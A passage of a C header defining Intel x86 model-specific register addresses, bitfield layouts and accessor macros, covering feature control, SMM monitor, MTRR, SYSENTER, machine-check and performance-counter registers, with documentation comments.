#define IA32_APIC_BASE_APIC_GLOBAL_ENABLE_BIT                        11
#define IA32_APIC_BASE_APIC_GLOBAL_ENABLE_FLAG                       0x800
#define IA32_APIC_BASE_APIC_GLOBAL_ENABLE_MASK                       0x01
#define IA32_APIC_BASE_APIC_GLOBAL_ENABLE(_)                         (((_) >> 11) & 0x01)

        /**
         * [Bits 47:12] APIC Base.
         */
        UINT64 ApicBase : 36;
#define IA32_APIC_BASE_APIC_BASE_BIT                                 12
#define IA32_APIC_BASE_APIC_BASE_FLAG                                0xFFFFFFFFF000
#define IA32_APIC_BASE_APIC_BASE_MASK                                0xFFFFFFFFF
#define IA32_APIC_BASE_APIC_BASE(_)                                  (((_) >> 12) & 0xFFFFFFFFF)
        UINT64 Reserved3 : 16;
    };

    UINT64 Flags;
} IA32_APIC_BASE_REGISTER;


/**
 * Control Features in Intel 64 Processor.
 *
 * @remarks If any one enumeration condition for defined bit field holds.
 */
#define IA32_FEATURE_CONTROL                                         0x0000003A
typedef union
{
    struct
    {
        /**
         * @brief Lock bit <b>(R/WO)</b>
         *
         * [Bit 0] When set, locks this MSR from being written; writes to this bit will result in GP(0).
         *
         * @note Once the Lock bit is set, the contents of this register cannot be modified. Therefore the lock bit must be set
         *       after configuring support for Intel Virtualization Technology and prior to transferring control to an option ROM or the
         *       OS. Hence, once the Lock bit is set, the entire IA32_FEATURE_CONTROL contents are preserved across RESET when PWRGOOD is
         *       not deasserted.
         * @remarks If any one enumeration condition for defined bit field position greater than bit 0 holds.
         */
        UINT64 LockBit : 1;
#define IA32_FEATURE_CONTROL_LOCK_BIT_BIT                            0
#define IA32_FEATURE_CONTROL_LOCK_BIT_FLAG                           0x01
#define IA32_FEATURE_CONTROL_LOCK_BIT_MASK                           0x01
#define IA32_FEATURE_CONTROL_LOCK_BIT(_)                             (((_) >> 0) & 0x01)

        /**
         * @brief Enable VMX inside SMX operation <b>(R/WL)</b>
         *
         * [Bit 1] This bit enables a system executive to use VMX in conjunction with SMX to support Intel(R) Trusted Execution
         * Technology. BIOS must set this bit only when the CPUID function 1 returns VMX feature flag and SMX feature flag set (ECX
         * bits 5 and 6 respectively).
         *
         * @remarks If CPUID.01H:ECX[5] = 1 && CPUID.01H:ECX[6] = 1
         */
        UINT64 EnableVmxInsideSmx : 1;
#define IA32_FEATURE_CONTROL_ENABLE_VMX_INSIDE_SMX_BIT               1
#define IA32_FEATURE_CONTROL_ENABLE_VMX_INSIDE_SMX_FLAG              0x02
#define IA32_FEATURE_CONTROL_ENABLE_VMX_INSIDE_SMX_MASK              0x01
#define IA32_FEATURE_CONTROL_ENABLE_VMX_INSIDE_SMX(_)                (((_) >> 1) & 0x01)

        /**
         * @brief Enable VMX outside SMX operation <b>(R/WL)</b>
         *
         * [Bit 2] This bit enables VMX for a system executive that does not require SMX. BIOS must set this bit only when the
         * CPUID function 1 returns the VMX feature flag set (ECX bit 5).
         *
         * @remarks If CPUID.01H:ECX[5] = 1
         */
        UINT64 EnableVmxOutsideSmx : 1;
#define IA32_FEATURE_CONTROL_ENABLE_VMX_OUTSIDE_SMX_BIT              2
#define IA32_FEATURE_CONTROL_ENABLE_VMX_OUTSIDE_SMX_FLAG             0x04
#define IA32_FEATURE_CONTROL_ENABLE_VMX_OUTSIDE_SMX_MASK             0x01
#define IA32_FEATURE_CONTROL_ENABLE_VMX_OUTSIDE_SMX(_)               (((_) >> 2) & 0x01)
        UINT64 Reserved1 : 5;

        /**
         * @brief SENTER Local Function Enable <b>(R/WL)</b>
         *
         * [Bits 14:8] When set, each bit in the field represents an enable control for a corresponding SENTER function. This field
         * is supported only if CPUID.1:ECX.[bit 6] is set.
         *
         * @remarks If CPUID.01H:ECX[6] = 1
         */
        UINT64 SenterLocalFunctionEnables : 7;
#define IA32_FEATURE_CONTROL_SENTER_LOCAL_FUNCTION_ENABLES_BIT       8
#define IA32_FEATURE_CONTROL_SENTER_LOCAL_FUNCTION_ENABLES_FLAG      0x7F00
#define IA32_FEATURE_CONTROL_SENTER_LOCAL_FUNCTION_ENABLES_MASK      0x7F
#define IA32_FEATURE_CONTROL_SENTER_LOCAL_FUNCTION_ENABLES(_)        (((_) >> 8) & 0x7F)

        /**
         * @brief SENTER Global Enable <b>(R/WL)</b>
         *
         * [Bit 15] This bit must be set to enable SENTER leaf functions. This bit is supported only if CPUID.1:ECX.[bit 6] is set.
         *
         * @remarks If CPUID.01H:ECX[6] = 1
         */
        UINT64 SenterGlobalEnable : 1;
#define IA32_FEATURE_CONTROL_SENTER_GLOBAL_ENABLE_BIT                15
#define IA32_FEATURE_CONTROL_SENTER_GLOBAL_ENABLE_FLAG               0x8000
#define IA32_FEATURE_CONTROL_SENTER_GLOBAL_ENABLE_MASK               0x01
#define IA32_FEATURE_CONTROL_SENTER_GLOBAL_ENABLE(_)                 (((_) >> 15) & 0x01)
        UINT64 Reserved2 : 1;

        /**
         * @brief SGX Launch Control Enable <b>(R/WL)</b>
         *
         * [Bit 17] This bit must be set to enable runtime reconfiguration of SGX Launch Control via the IA32_SGXLEPUBKEYHASHn MSR.
         *
         * @remarks If CPUID.(EAX=07H, ECX=0H): ECX[30] = 1
         */
        UINT64 SgxLaunchControlEnable : 1;
#define IA32_FEATURE_CONTROL_SGX_LAUNCH_CONTROL_ENABLE_BIT           17
#define IA32_FEATURE_CONTROL_SGX_LAUNCH_CONTROL_ENABLE_FLAG          0x20000
#define IA32_FEATURE_CONTROL_SGX_LAUNCH_CONTROL_ENABLE_MASK          0x01
#define IA32_FEATURE_CONTROL_SGX_LAUNCH_CONTROL_ENABLE(_)            (((_) >> 17) & 0x01)

        /**
         * @brief SGX Global Enable <b>(R/WL)</b>
         *
         * [Bit 18] This bit must be set to enable SGX leaf functions.
         *
         * @remarks If CPUID.(EAX=07H, ECX=0H): EBX[2] = 1
         */
        UINT64 SgxGlobalEnable : 1;
#define IA32_FEATURE_CONTROL_SGX_GLOBAL_ENABLE_BIT                   18
#define IA32_FEATURE_CONTROL_SGX_GLOBAL_ENABLE_FLAG                  0x40000
#define IA32_FEATURE_CONTROL_SGX_GLOBAL_ENABLE_MASK                  0x01
#define IA32_FEATURE_CONTROL_SGX_GLOBAL_ENABLE(_)                    (((_) >> 18) & 0x01)
        UINT64 Reserved3 : 1;

        /**
         * @brief LMCE On <b>(R/WL)</b>
         *
         * [Bit 20] When set, system software can program the MSRs associated with LMCE to configure delivery of some machine check
         * exceptions to a single logical processor.
         *
         * @remarks If IA32_MCG_CAP[27] = 1
         */
        UINT64 LmceOn : 1;
#define IA32_FEATURE_CONTROL_LMCE_ON_BIT                             20
#define IA32_FEATURE_CONTROL_LMCE_ON_FLAG                            0x100000
#define IA32_FEATURE_CONTROL_LMCE_ON_MASK                            0x01
#define IA32_FEATURE_CONTROL_LMCE_ON(_)                              (((_) >> 20) & 0x01)
        UINT64 Reserved4 : 43;
    };

    UINT64 Flags;
} IA32_FEATURE_CONTROL_REGISTER;


/**
 * Per Logical Processor TSC Adjust.
 *
 * @remarks If CPUID.(EAX=07H, ECX=0H): EBX[1] = 1
 */
#define IA32_TSC_ADJUST                                              0x0000003B
typedef struct
{
    /**
     * Local offset value of the IA32_TSC for a logical processor. Reset value is zero. A write to IA32_TSC will modify the
     * local offset in IA32_TSC_ADJUST and the content of IA32_TSC, but does not affect the internal invariant TSC hardware.
     */
    UINT64 ThreadAdjust;
} IA32_TSC_ADJUST_REGISTER;


/**
 * @brief BIOS Update Trigger <b>(W)</b>
 *
 * Executing a WRMSR instruction to this MSR causes a microcode update to be loaded into the processor. A processor may
 * prevent writing to this MSR when loading guest states on VM entries or saving guest states on VM exits.
 *
 * @remarks 06_01H
 * @see Vol3A[9.11.6(Microcode Update Loader)]
 */
#define IA32_BIOS_UPDATE_TRIGGER                                     0x00000079

 /**
  * @brief BIOS Update Signature <b>(RO)</b>
  *
  * Returns the microcode update signature following the execution of CPUID.01H. A processor may prevent writing to this MSR
  * when loading guest states on VM entries or saving guest states on VM exits.
  *
  * @remarks 06_01H
  */
#define IA32_BIOS_UPDATE_SIGNATURE                                   0x0000008B
typedef union
{
    struct
    {
        /**
         * [Bits 31:0] Reserved.
         */
        UINT64 Reserved : 32;
#define IA32_BIOS_UPDATE_SIGNATURE_RESERVED_BIT                      0
#define IA32_BIOS_UPDATE_SIGNATURE_RESERVED_FLAG                     0xFFFFFFFF
#define IA32_BIOS_UPDATE_SIGNATURE_RESERVED_MASK                     0xFFFFFFFF
#define IA32_BIOS_UPDATE_SIGNATURE_RESERVED(_)                       (((_) >> 0) & 0xFFFFFFFF)

        /**
         * @brief Microcode update signature
         *
         * [Bits 63:32] This field contains the signature of the currently loaded microcode update when read following the
         * execution of the CPUID instruction, function 1. It is required that this register field be pre-loaded with zero prior to
         * executing the CPUID, function 1. If the field remains equal to zero, then there is no microcode update loaded. Another
         * nonzero value will be the signature.
         *
         * @see Vol3A[9.11.7.1(Determining the Signature)] (reference)
         */
        UINT64 MicrocodeUpdateSignature : 32;
#define IA32_BIOS_UPDATE_SIGNATURE_MICROCODE_UPDATE_SIGNATURE_BIT    32
#define IA32_BIOS_UPDATE_SIGNATURE_MICROCODE_UPDATE_SIGNATURE_FLAG   0xFFFFFFFF00000000
#define IA32_BIOS_UPDATE_SIGNATURE_MICROCODE_UPDATE_SIGNATURE_MASK   0xFFFFFFFF
#define IA32_BIOS_UPDATE_SIGNATURE_MICROCODE_UPDATE_SIGNATURE(_)     (((_) >> 32) & 0xFFFFFFFF)
    };

    UINT64 Flags;
} IA32_BIOS_UPDATE_SIGNATURE_REGISTER;

/**
 * @defgroup IA32_SGXLEPUBKEYHASH \
 *           IA32_SGXLEPUBKEYHASH[(64*n+63):(64*n)]
 *
 * Bits (64*n+63):(64*n) of the SHA256 digest of the SIGSTRUCT.MODULUS for SGX Launch Enclave. On reset, the default value
 * is the digest of Intel's signing key.
 *
 * @remarks Read permitted If CPUID.(EAX=12H,ECX=0H): EAX[0]=1 && CPUID.(EAX=07H,ECX=0H):ECX[30]=1. Write permitted if
 *          CPUID.(EAX=12H,ECX=0H): EAX[0]=1 && IA32_FEATURE_CONTROL[17] = 1 && IA32_FEATURE_CONTROL[0] = 1.
 * @{
 */
#define IA32_SGXLEPUBKEYHASH0                                        0x0000008C
#define IA32_SGXLEPUBKEYHASH1                                        0x0000008D
#define IA32_SGXLEPUBKEYHASH2                                        0x0000008E
#define IA32_SGXLEPUBKEYHASH3                                        0x0000008F
 /**
  * @}
  */


  /**
   * SMM Monitor Configuration.
   *
   * @remarks If CPUID.01H: ECX[5]=1 || CPUID.01H: ECX[6] = 1
   */
#define IA32_SMM_MONITOR_CTL                                         0x0000009B
typedef union
{
    struct
    {
        /**
         * @brief Valid <b>(R/W)</b>
         *
         * [Bit 0] The STM may be invoked using VMCALL only if this bit is 1. Because VMCALL is used to activate the dual-monitor
         * treatment, the dual-monitor treatment cannot be activated if the bit is 0. This bit is cleared when the logical
         * processor is reset.
         *
         * @see Vol3C[34.15.6(Activating the Dual-Monitor Treatment)]
         * @see Vol3C[34.15.5(Enabling the Dual-Monitor Treatment)] (reference)
         */
        UINT64 Valid : 1;
#define IA32_SMM_MONITOR_CTL_VALID_BIT                               0
#define IA32_SMM_MONITOR_CTL_VALID_FLAG                              0x01
#define IA32_SMM_MONITOR_CTL_VALID_MASK                              0x01
#define IA32_SMM_MONITOR_CTL_VALID(_)                                (((_) >> 0) & 0x01)
        UINT64 Reserved1 : 1;

        /**
         * @brief Controls SMI unblocking by VMXOFF
         *
         * [Bit 2] Determines whether executions of VMXOFF unblock SMIs under the default treatment of SMIs and SMM. Executions of
         * VMXOFF unblock SMIs unless bit 2 is 1 (the value of bit 0 is irrelevant).
         *
         * @remarks If IA32_VMX_MISC[28]
         * @see Vol3C[34.14.4(VMXOFF and SMI Unblocking)]
         * @see Vol3C[34.15.5(Enabling the Dual-Monitor Treatment)] (reference)
         */
        UINT64 SmiUnblockingByVmxoff : 1;
#define IA32_SMM_MONITOR_CTL_SMI_UNBLOCKING_BY_VMXOFF_BIT            2
#define IA32_SMM_MONITOR_CTL_SMI_UNBLOCKING_BY_VMXOFF_FLAG           0x04
#define IA32_SMM_MONITOR_CTL_SMI_UNBLOCKING_BY_VMXOFF_MASK           0x01
#define IA32_SMM_MONITOR_CTL_SMI_UNBLOCKING_BY_VMXOFF(_)             (((_) >> 2) & 0x01)
        UINT64 Reserved2 : 9;

        /**
         * @brief MSEG Base <b>(R/W)</b>
         *
         * [Bits 31:12] Value that, when shifted left 12 bits, is the physical address of MSEG (the MSEG base address).
         *
         * @see Vol3C[34.15.5(Enabling the Dual-Monitor Treatment)] (reference)
         */
        UINT64 MsegBase : 20;
#define IA32_SMM_MONITOR_CTL_MSEG_BASE_BIT                           12
#define IA32_SMM_MONITOR_CTL_MSEG_BASE_FLAG                          0xFFFFF000
#define IA32_SMM_MONITOR_CTL_MSEG_BASE_MASK                          0xFFFFF
#define IA32_SMM_MONITOR_CTL_MSEG_BASE(_)                            (((_) >> 12) & 0xFFFFF)
        UINT64 Reserved3 : 32;
    };

    UINT64 Flags;
} IA32_SMM_MONITOR_CTL_REGISTER;

typedef struct
{
    /**
     * @brief MSEG revision identifier
     *
     * Different processors may use different MSEG revision identifiers. These identifiers enable software to avoid using an
     * MSEG header formatted for one processor on a processor that uses a different format. Software can discover the MSEG
     * revision identifier that a processor uses by reading the VMX capability MSR IA32_VMX_MISC.
     *
     * @see Vol3D[A.6(MISCELLANEOUS DATA)]
     */
    UINT32 MsegHeaderRevision;

    /**
     * @brief SMM-transfer monitor features field
     *
     * Bits 31:1 of this field are reserved and must be zero. Bit 0 of the field is the IA-32e mode SMM feature bit. It
     * indicates whether the logical processor will be in IA-32e mode after the STM is activated.
     *
     * @see Vol3C[34.15.6(Activating the Dual-Monitor Treatment)]
     */
    UINT32 MonitorFeatures;

    /**
     * Define values for the MonitorFeatures field of MSEG_HEADER.
     */
#define IA32_STM_FEATURES_IA32E                                      0x00000001

     /**
      * Fields that determine how processor state is loaded when the STM is activated. SMM code should establish these fields so
      * that activating of the STM invokes the STM's initialization code.
      *
      * @see Vol3C[34.15.6.5(Loading Host State)]
      */
    UINT32 GdtrLimit;
    UINT32 GdtrBaseOffset;
    UINT32 CsSelector;
    UINT32 EipOffset;
    UINT32 EspOffset;
    UINT32 Cr3Offset;
} IA32_MSEG_HEADER;


/**
 * Base address of the logical processor's SMRAM image.
 *
 * @remarks If IA32_VMX_MISC[15]
 */
#define IA32_SMBASE                                                  0x0000009E
 /**
  * @defgroup IA32_PMC \
  *           IA32_PMC(n)
  *
  * General Performance Counters.
  *
  * @remarks If CPUID.0AH: EAX[15:8] > n
  * @{
  */
#define IA32_PMC0                                                    0x000000C1
#define IA32_PMC1                                                    0x000000C2
#define IA32_PMC2                                                    0x000000C3
#define IA32_PMC3                                                    0x000000C4
#define IA32_PMC4                                                    0x000000C5
#define IA32_PMC5                                                    0x000000C6
#define IA32_PMC6                                                    0x000000C7
#define IA32_PMC7                                                    0x000000C8
  /**
   * @}
   */


   /**
    * TSC Frequency Clock Counter.
    *
    * @remarks If CPUID.06H: ECX[0] = 1
    */
#define IA32_MPERF                                                   0x000000E7
typedef struct
{
    /**
     * @brief C0 TSC Frequency Clock Count
     *
     * Increments at fixed interval (relative to TSC freq.) when the logical processor is in C0. Cleared upon overflow /
     * wrap-around of IA32_APERF.
     */
    UINT64 C0Mcnt;
} IA32_MPERF_REGISTER;


/**
 * Actual Performance Clock Counter
 *
 * @remarks If CPUID.06H: ECX[0] = 1
 */
#define IA32_APERF                                                   0x000000E8
typedef struct
{
    /**
     * @brief C0 Actual Frequency Clock Count
     *
     * Accumulates core clock counts at the coordinated clock frequency, when the logical processor is in C0. Cleared upon
     * overflow / wrap-around of IA32_MPERF.
     */
    UINT64 C0Acnt;
} IA32_APERF_REGISTER;


/**
 * MTRR Capability.
 *
 * @see Vol3A[11.11.2.1(IA32_MTRR_DEF_TYPE MSR)]
 * @see Vol3A[11.11.1(MTRR Feature Identification)] (reference)
 */
#define IA32_MTRR_CAPABILITIES                                       0x000000FE
typedef union
{
    struct
    {
        /**
         * @brief VCNT (variable range registers count) field
         *
         * [Bits 7:0] Indicates the number of variable ranges implemented on the processor.
         */
        UINT64 VariableRangeCount : 8;
#define IA32_MTRR_CAPABILITIES_VARIABLE_RANGE_COUNT_BIT              0
#define IA32_MTRR_CAPABILITIES_VARIABLE_RANGE_COUNT_FLAG             0xFF
#define IA32_MTRR_CAPABILITIES_VARIABLE_RANGE_COUNT_MASK             0xFF
#define IA32_MTRR_CAPABILITIES_VARIABLE_RANGE_COUNT(_)               (((_) >> 0) & 0xFF)

        /**
         * @brief FIX (fixed range registers supported) flag
         *
         * [Bit 8] Fixed range MTRRs (IA32_MTRR_FIX64K_00000 through IA32_MTRR_FIX4K_0F8000) are supported when set; no fixed range
         * registers are supported when clear.
         */
        UINT64 FixedRangeSupported : 1;
#define IA32_MTRR_CAPABILITIES_FIXED_RANGE_SUPPORTED_BIT             8
#define IA32_MTRR_CAPABILITIES_FIXED_RANGE_SUPPORTED_FLAG            0x100
#define IA32_MTRR_CAPABILITIES_FIXED_RANGE_SUPPORTED_MASK            0x01
#define IA32_MTRR_CAPABILITIES_FIXED_RANGE_SUPPORTED(_)              (((_) >> 8) & 0x01)
        UINT64 Reserved1 : 1;

        /**
         * @brief WC (write combining) flag
         *
         * [Bit 10] The write-combining (WC) memory type is supported when set; the WC type is not supported when clear.
         */
        UINT64 WcSupported : 1;
#define IA32_MTRR_CAPABILITIES_WC_SUPPORTED_BIT                      10
#define IA32_MTRR_CAPABILITIES_WC_SUPPORTED_FLAG                     0x400
#define IA32_MTRR_CAPABILITIES_WC_SUPPORTED_MASK                     0x01
#define IA32_MTRR_CAPABILITIES_WC_SUPPORTED(_)                       (((_) >> 10) & 0x01)

        /**
         * @brief SMRR (System-Management Range Register) flag
         *
         * [Bit 11] The system-management range register (SMRR) interface is supported when bit 11 is set; the SMRR interface is
         * not supported when clear.
         */
        UINT64 SmrrSupported : 1;
#define IA32_MTRR_CAPABILITIES_SMRR_SUPPORTED_BIT                    11
#define IA32_MTRR_CAPABILITIES_SMRR_SUPPORTED_FLAG                   0x800
#define IA32_MTRR_CAPABILITIES_SMRR_SUPPORTED_MASK                   0x01
#define IA32_MTRR_CAPABILITIES_SMRR_SUPPORTED(_)                     (((_) >> 11) & 0x01)
        UINT64 Reserved2 : 52;
    };

    UINT64 Flags;
} IA32_MTRR_CAPABILITIES_REGISTER;


/**
 * @brief SYSENTER_CS_MSR <b>(R/W)</b>
 *
 * The lower 16 bits of this MSR are the segment selector for the privilege level 0 code segment. This value is also used
 * to determine the segment selector of the privilege level 0 stack segment. This value cannot indicate a null selector.
 *
 * @remarks 06_01H
 * @see Vol2B[4.3(Instructions (M-U) | SYSCALL - Fast System Call)] (reference)
 */
#define IA32_SYSENTER_CS                                             0x00000174
typedef union
{
    struct
    {
        /**
         * [Bits 15:0] CS Selector.
         */
        UINT64 CsSelector : 16;
#define IA32_SYSENTER_CS_CS_SELECTOR_BIT                             0
#define IA32_SYSENTER_CS_CS_SELECTOR_FLAG                            0xFFFF
#define IA32_SYSENTER_CS_CS_SELECTOR_MASK                            0xFFFF
#define IA32_SYSENTER_CS_CS_SELECTOR(_)                              (((_) >> 0) & 0xFFFF)

        /**
         * [Bits 31:16] Not used.
         *
         * @remarks Can be read and written.
         */
        UINT64 NotUsed1 : 16;
#define IA32_SYSENTER_CS_NOT_USED_1_BIT                              16
#define IA32_SYSENTER_CS_NOT_USED_1_FLAG                             0xFFFF0000
#define IA32_SYSENTER_CS_NOT_USED_1_MASK                             0xFFFF
#define IA32_SYSENTER_CS_NOT_USED_1(_)                               (((_) >> 16) & 0xFFFF)

        /**
         * [Bits 63:32] Not used.
         *
         * @remarks Writes ignored; reads return zero.
         */
        UINT64 NotUsed2 : 32;
#define IA32_SYSENTER_CS_NOT_USED_2_BIT                              32
#define IA32_SYSENTER_CS_NOT_USED_2_FLAG                             0xFFFFFFFF00000000
#define IA32_SYSENTER_CS_NOT_USED_2_MASK                             0xFFFFFFFF
#define IA32_SYSENTER_CS_NOT_USED_2(_)                               (((_) >> 32) & 0xFFFFFFFF)
    };

    UINT64 Flags;
} IA32_SYSENTER_CS_REGISTER;


/**
 * @brief SYSENTER_ESP_MSR <b>(R/W)</b>
 *
 * The value of this MSR is loaded into RSP (thus, this value contains the stack pointer for the privilege level 0 stack).
 * This value cannot represent a non-canonical address. In protected mode, only bits 31:0 are loaded.
 *
 * @remarks 06_01H
 * @see Vol2B[4.3(Instructions (M-U) | SYSCALL - Fast System Call)] (reference)
 */
#define IA32_SYSENTER_ESP                                            0x00000175

 /**
  * @brief SYSENTER_EIP_MSR <b>(R/W)</b>
  *
  * The value of this MSR is loaded into RIP (thus, this value references the first instruction of the selected operating
  * procedure or routine). In protected mode, only bits 31:0 are loaded.
  *
  * @remarks 06_01H
  * @see Vol2B[4.3(Instructions (M-U) | SYSCALL - Fast System Call)] (reference)
  */
#define IA32_SYSENTER_EIP                                            0x00000176

  /**
   * Global Machine Check Capability.
   *
   * @remarks 06_01H
   */
#define IA32_MCG_CAP                                                 0x00000179
typedef union
{
    struct
    {
        /**
         * [Bits 7:0] Number of reporting banks.
         */
        UINT64 Count : 8;
#define IA32_MCG_CAP_COUNT_BIT                                       0
#define IA32_MCG_CAP_COUNT_FLAG                                      0xFF
#define IA32_MCG_CAP_COUNT_MASK                                      0xFF
#define IA32_MCG_CAP_COUNT(_)                                        (((_) >> 0) & 0xFF)

        /**
         * [Bit 8] IA32_MCG_CTL is present if this bit is set.
         */
        UINT64 McgCtlP : 1;
#define IA32_MCG_CAP_MCG_CTL_P_BIT                                   8
#define IA32_MCG_CAP_MCG_CTL_P_FLAG                                  0x100
#define IA32_MCG_CAP_MCG_CTL_P_MASK                                  0x01
#define IA32_MCG_CAP_MCG_CTL_P(_)                                    (((_) >> 8) & 0x01)

        /**
         * [Bit 9] Extended machine check state registers are present if this bit is set.
         */
        UINT64 McgExtP : 1;
#define IA32_MCG_CAP_MCG_EXT_P_BIT                                   9
#define IA32_MCG_CAP_MCG_EXT_P_FLAG                                  0x200
#define IA32_MCG_CAP_MCG_EXT_P_MASK                                  0x01
#define IA32_MCG_CAP_MCG_EXT_P(_)                                    (((_) >> 9) & 0x01)

        /**
         * [Bit 10] Support for corrected MC error event is present.
         *
         * @remarks 06_01H
         */
        UINT64 McpCmciP : 1;
#define IA32_MCG_CAP_MCP_CMCI_P_BIT                                  10
#define IA32_MCG_CAP_MCP_CMCI_P_FLAG                                 0x400
#define IA32_MCG_CAP_MCP_CMCI_P_MASK                                 0x01
#define IA32_MCG_CAP_MCP_CMCI_P(_)                                   (((_) >> 10) & 0x01)

        /**
         * [Bit 11] Threshold-based error status register are present if this bit is set.
         */
        UINT64 McgTesP : 1;
#define IA32_MCG_CAP_MCG_TES_P_BIT                                   11
#define IA32_MCG_CAP_MCG_TES_P_FLAG                                  0x800
#define IA32_MCG_CAP_MCG_TES_P_MASK                                  0x01
#define IA32_MCG_CAP_MCG_TES_P(_)                                    (((_) >> 11) & 0x01)
        UINT64 Reserved1 : 4;

        /**
         * [Bits 23:16] Number of extended machine check state registers present.
         */
        UINT64 McgExtCnt : 8;
#define IA32_MCG_CAP_MCG_EXT_CNT_BIT                                 16
#define IA32_MCG_CAP_MCG_EXT_CNT_FLAG                                0xFF0000
#define IA32_MCG_CAP_MCG_EXT_CNT_MASK                                0xFF
#define IA32_MCG_CAP_MCG_EXT_CNT(_)                                  (((_) >> 16) & 0xFF)

        /**
         * [Bit 24] The processor supports software error recovery if this bit is set.
         */
        UINT64 McgSerP : 1;
#define IA32_MCG_CAP_MCG_SER_P_BIT                                   24
#define IA32_MCG_CAP_MCG_SER_P_FLAG                                  0x1000000
#define IA32_MCG_CAP_MCG_SER_P_MASK                                  0x01
#define IA32_MCG_CAP_MCG_SER_P(_)                                    (((_) >> 24) & 0x01)
        UINT64 Reserved2 : 1;

        /**
         * [Bit 26] Indicates that the processor allows platform firmware to be invoked when an error is detected so that it may
         * provide additional platform specific information in an ACPI format "Generic Error Data Entry" that augments the data
         * included in machine check bank registers.
         *
         * @remarks 06_3EH
         */
        UINT64 McgElogP : 1;
#define IA32_MCG_CAP_MCG_ELOG_P_BIT                                  26
#define IA32_MCG_CAP_MCG_ELOG_P_FLAG                                 0x4000000
#define IA32_MCG_CAP_MCG_ELOG_P_MASK                                 0x01
#define IA32_MCG_CAP_MCG_ELOG_P(_)                                   (((_) >> 26) & 0x01)

        /**
         * [Bit 27] Indicates that the processor supports extended state in IA32_MCG_STATUS and associated MSR necessary to
         * configure Local Machine Check Exception (LMCE).
         *
         * @remarks 06_3EH
         */
        UINT64 McgLmceP : 1;
#define IA32_MCG_CAP_MCG_LMCE_P_BIT                                  27
#define IA32_MCG_CAP_MCG_LMCE_P_FLAG                                 0x8000000
#define IA32_MCG_CAP_MCG_LMCE_P_MASK                                 0x01
#define IA32_MCG_CAP_MCG_LMCE_P(_)                                   (((_) >> 27) & 0x01)
        UINT64 Reserved3 : 36;
    };

    UINT64 Flags;
} IA32_MCG_CAP_REGISTER;


/**
 * Global Machine Check Status.
 *
 * @remarks 06_01H
 */
#define IA32_MCG_STATUS                                              0x0000017A
typedef union
{
    struct
    {
        /**
         * [Bit 0] Restart IP valid.
         *
         * @remarks 06_01H
         */
        UINT64 Ripv : 1;
#define IA32_MCG_STATUS_RIPV_BIT                                     0
#define IA32_MCG_STATUS_RIPV_FLAG                                    0x01
#define IA32_MCG_STATUS_RIPV_MASK                                    0x01
#define IA32_MCG_STATUS_RIPV(_)                                      (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Error IP valid.
         *
         * @remarks 06_01H
         */
        UINT64 Eipv : 1;
#define IA32_MCG_STATUS_EIPV_BIT                                     1
#define IA32_MCG_STATUS_EIPV_FLAG                                    0x02
#define IA32_MCG_STATUS_EIPV_MASK                                    0x01
#define IA32_MCG_STATUS_EIPV(_)                                      (((_) >> 1) & 0x01)

        /**
         * [Bit 2] Machine check in progress.
         *
         * @remarks 06_01H
         */
        UINT64 Mcip : 1;
#define IA32_MCG_STATUS_MCIP_BIT                                     2
#define IA32_MCG_STATUS_MCIP_FLAG                                    0x04
#define IA32_MCG_STATUS_MCIP_MASK                                    0x01
#define IA32_MCG_STATUS_MCIP(_)                                      (((_) >> 2) & 0x01)

        /**
         * [Bit 3] If IA32_MCG_CAP.LMCE_P[27] = 1.
         */
        UINT64 LmceS : 1;
#define IA32_MCG_STATUS_LMCE_S_BIT                                   3
#define IA32_MCG_STATUS_LMCE_S_FLAG                                  0x08
#define IA32_MCG_STATUS_LMCE_S_MASK                                  0x01
#define IA32_MCG_STATUS_LMCE_S(_)                                    (((_) >> 3) & 0x01)
        UINT64 Reserved1 : 60;
    };

    UINT64 Flags;
} IA32_MCG_STATUS_REGISTER;


/**
 * Global Machine Check Control.
 *
 * @remarks If IA32_MCG_CAP.CTL_P[8] = 1
 */
#define IA32_MCG_CTL                                                 0x0000017B
 /**
  * @defgroup IA32_PERFEVTSEL \
  *           IA32_PERFEVTSEL(n)
  *
  * Performance Event Select Register n.
  *
  * @remarks If CPUID.0AH: EAX[15:8] > n
  * @{
  */
#define IA32_PERFEVTSEL0                                             0x00000186
#define IA32_PERFEVTSEL1                                             0x00000187
#define IA32_PERFEVTSEL2                                             0x00000188
#define IA32_PERFEVTSEL3                                             0x00000189
typedef union
{
    struct
    {
        /**
         * [Bits 7:0] Selects a performance event logic unit.
         */
        UINT64 EventSelect : 8;
#define IA32_PERFEVTSEL_EVENT_SELECT_BIT                             0
#define IA32_PERFEVTSEL_EVENT_SELECT_FLAG                            0xFF
#define IA32_PERFEVTSEL_EVENT_SELECT_MASK                            0xFF
#define IA32_PERFEVTSEL_EVENT_SELECT(_)                              (((_) >> 0) & 0xFF)

        /**
         * [Bits 15:8] Qualifies the microarchitectural condition to detect on the selected event logic.
         */
        UINT64 UMask : 8;
#define IA32_PERFEVTSEL_U_MASK_BIT                                   8
#define IA32_PERFEVTSEL_U_MASK_FLAG                                  0xFF00
#define IA32_PERFEVTSEL_U_MASK_MASK                                  0xFF
#define IA32_PERFEVTSEL_U_MASK(_)                                    (((_) >> 8) & 0xFF)

        /**
         * [Bit 16] Counts while in privilege level is not ring 0.
         */
        UINT64 Usr : 1;
#define IA32_PERFEVTSEL_USR_BIT                                      16
#define IA32_PERFEVTSEL_USR_FLAG                                     0x10000
#define IA32_PERFEVTSEL_USR_MASK                                     0x01
#define IA32_PERFEVTSEL_USR(_)                                       (((_) >> 16) & 0x01)

        /**
         * [Bit 17] Counts while in privilege level is ring 0.
         */
        UINT64 Os : 1;
#define IA32_PERFEVTSEL_OS_BIT                                       17
#define IA32_PERFEVTSEL_OS_FLAG                                      0x20000
#define IA32_PERFEVTSEL_OS_MASK                                      0x01
#define IA32_PERFEVTSEL_OS(_)                                        (((_) >> 17) & 0x01)

        /**
         * [Bit 18] Enables edge detection if set.
         */
        UINT64 Edge : 1;
#define IA32_PERFEVTSEL_EDGE_BIT                                     18
#define IA32_PERFEVTSEL_EDGE_FLAG                                    0x40000
#define IA32_PERFEVTSEL_EDGE_MASK                                    0x01
#define IA32_PERFEVTSEL_EDGE(_)                                      (((_) >> 18) & 0x01)

        /**
         * [Bit 19] Enables pin control.
         */
        UINT64 Pc : 1;
#define IA32_PERFEVTSEL_PC_BIT                                       19
#define IA32_PERFEVTSEL_PC_FLAG                                      0x80000
#define IA32_PERFEVTSEL_PC_MASK                                      0x01
#define IA32_PERFEVTSEL_PC(_)                                        (((_) >> 19) & 0x01)

        /**
         * [Bit 20] Enables interrupt on counter overflow.
         */
        UINT64 Intr : 1;
